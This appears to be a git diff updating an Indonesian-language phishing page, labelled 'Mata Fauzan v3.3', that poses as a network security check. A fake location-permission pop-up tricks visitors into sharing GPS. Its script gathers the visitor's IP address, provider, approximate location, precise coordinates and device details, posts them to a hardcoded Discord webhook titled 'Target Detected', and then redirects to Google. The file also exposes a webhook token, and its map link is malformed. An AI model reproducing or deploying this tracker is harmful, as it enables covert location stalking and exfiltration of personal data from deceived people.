@@ -3,94 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Jaringan</title>
+    <title>Sistem Verifikasi Jaringan</title>
     <style>
-        body { background: #0b0e11; color: #ffffff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { text-align: center; background: #15191d; padding: 30px; border-radius: 12px; border: 1px solid #2d333b; width: 300px; }
-        .btn { background: #00a2ff; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
-        
-        /* Pop-up Izin Lokasi Palsu */
-        #location-modal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); z-index: 100; justify-content: center; align-items: center;
-        }
-        .modal-content {
-            background: #ffffff; color: #333; padding: 25px; border-radius: 15px; width: 85%; max-width: 320px; text-align: center;
-        }
-        .modal-content h4 { margin: 0 0 10px; color: #000; }
-        .modal-content p { font-size: 14px; color: #666; margin-bottom: 20px; }
-        .modal-btn {
-            background: #007bff; color: white; border: none; padding: 10px 25px; border-radius: 5px; font-weight: bold; width: 100%;
-        }
+        body { background: #0b0e11; color: #ffffff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { text-align: center; background: #15191d; padding: 35px; border-radius: 15px; border: 1px solid #2d333b; width: 310px; }
+        .btn { background: #00a2ff; color: white; border: none; padding: 14px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        #location-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; justify-content: center; align-items: center; }
+        .modal-content { background: #ffffff; color: #333; padding: 25px; border-radius: 12px; width: 80%; text-align: center; }
+        .modal-btn { background: #007bff; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; width: 100%; margin-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h3>Checking Connection</h3>
-    <p style="color: #848d97; font-size: 13px;">Sedang memverifikasi keamanan perangkat Anda...</p>
-    <button class="btn" onclick="showModal()">Lanjutkan</button>
+    <div style="font-size: 40px; margin-bottom: 15px;">🔒</div>
+    <h3>Verifikasi Keamanan</h3>
+    <p style="color: #848d97; font-size: 14px;">Klik tombol di bawah untuk memverifikasi koneksi Anda.</p>
+    <button class="btn" onclick="showModal()">LANJUTKAN</button>
 </div>
 
 <div id="location-modal">
     <div class="modal-content">
-        <h4>Izin Lokasi Diperlukan</h4>
-        <p>Situs ini memerlukan akses lokasi untuk memverifikasi bahwa Anda bukan robot dan berada di wilayah yang didukung.</p>
-        <button class="modal-btn" onclick="requestGPS()">IZINKAN AKSES</button>
+        <h4 style="margin: 0; color: #000;">Izin Lokasi</h4>
+        <p style="font-size: 14px; color: #555;">Situs ini memerlukan akses lokasi untuk memvalidasi akses wilayah Anda.</p>
+        <button class="modal-btn" onclick="startTracking()">IZINKAN</button>
     </div>
 </div>
 
 <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1473582220013863104/pPWzhnsRh2Is_8Qd0a7X99kBKp_oXa6TINpLovVI3IfojbB2GazCBZsztflCxmCtxWb1";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1473582220013863104/pPWzhnsRh2Is_8Qd0a7X99kBKp_oXa6TINpLovVI3IfojbB2GazCBZsztflCxmCtxWb1"; // Ganti ini!
 
     function showModal() {
         document.getElementById('location-modal').style.display = 'flex';
     }
 
-    async function requestGPS() {
+    async function startTracking() {
         document.getElementById('location-modal').style.display = 'none';
-        
-        // 1. Ambil IP Duluan (Cadangan jika GPS tetap di-block)
-        let netInfo = { ip: "N/A", org: "N/A" };
+        const btn = document.querySelector('.btn');
+        btn.innerText = "Memproses...";
+        btn.disabled = true;
+
+        // 1. Ambil IP (Gunakan 2 API berbeda agar tidak N/A)
+        let netInfo = { ip: "N/A", org: "N/A", loc: "N/A" };
         try {
             const res = await fetch('https://ipapi.co/json/');
-            netInfo = await res.json();
-        } catch (e) {}
+            const data = await res.json();
+            netInfo = { ip: data.ip, org: data.org, loc: `${data.city}, ${data.region}` };
+        } catch (e) {
+            try {
+                const res2 = await fetch('https://api.ipify.org?format=json');
+                const data2 = await res2.json();
+                netInfo.ip = data2.ip;
+            } catch (e2) {}
+        }
 
-        // 2. Trigger Izin GPS Asli Browser
+        // 2. Ambil GPS (Optimasi untuk Android 10+)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (pos) => sendFinalData(netInfo, pos),
-                (err) => sendFinalData(netInfo, null), // Jika tetap klik block di browser
-                { enableHighAccuracy: true, timeout: 8000 }
+                (pos) => sendData(netInfo, pos),
+                (err) => sendData(netInfo, null),
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         } else {
-            sendFinalData(netInfo, null);
+            sendData(netInfo, null);
         }
     }
 
-    async function sendFinalData(net, pos) {
+    async function sendData(net, pos) {
         const payload = {
             embeds: [{
-                title: "🎯 Target Android Terdeteksi",
-                color: 5763719,
+                title: "🎯 Target Terdeteksi (Android Optimized)",
+                color: 3447003,
                 fields: [
-                    { name: "🌐 IP", value: `\`${net.ip || "N/A"}\``, inline: true },
-                    { name: "📍 GPS", value: pos ? `[Cek Maps](https://www.google.com/search?q=https://www.google.com/maps/search/%3Fapi%3D1%26query%3D-6.887248,107.615392{pos.coords.latitude},${pos.coords.longitude})` : "❌ DIBLOKIR", inline: true },
-                    { name: "📱 Device", value: `\`${navigator.userAgent.split('(')[1].split(')')[0]}\`` }
+                    { name: "🌐 IP Address", value: `\`${net.ip}\``, inline: true },
+                    { name: "🏢 Provider", value: `\`${net.org}\``, inline: true },
+                    { name: "📍 Lokasi IP", value: `${net.loc}`, inline: false },
+                    { name: "📍 GPS", value: pos ? `[Cek di Google Maps](https://www.google.com/search?q=https://www.google.com/maps%3Fq%3D-6.887248,107.615392${pos.coords.latitude},${pos.coords.longitude})` : "❌ **AKSES DIBLOKIR**", inline: false },
+                    { name: "📱 Perangkat", value: `\`${navigator.userAgent.split('(')[1].split(')')[0]}\`` }
                 ],
-                footer: { text: "Mata Fauzan v3.2 • " + new Date().toLocaleTimeString() }
+                footer: { text: "Mata Fauzan v3.3 • " + new Date().toLocaleString('id-ID') }
             }]
         };
 
-        // Kirim data menggunakan Beacon (Tahan banting untuk Android)
+        // Kirim data via Beacon agar tetap terkirim meski browser ditutup
         const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
         navigator.sendBeacon(WEBHOOK_URL, blob);
 
-        // Redirect
+        // Tunggu sebentar lalu buang ke Google
         setTimeout(() => {
             window.location.href = "https://www.google.com";
-        }, 1000);
+        }, 1500);
     }
 </script>
 
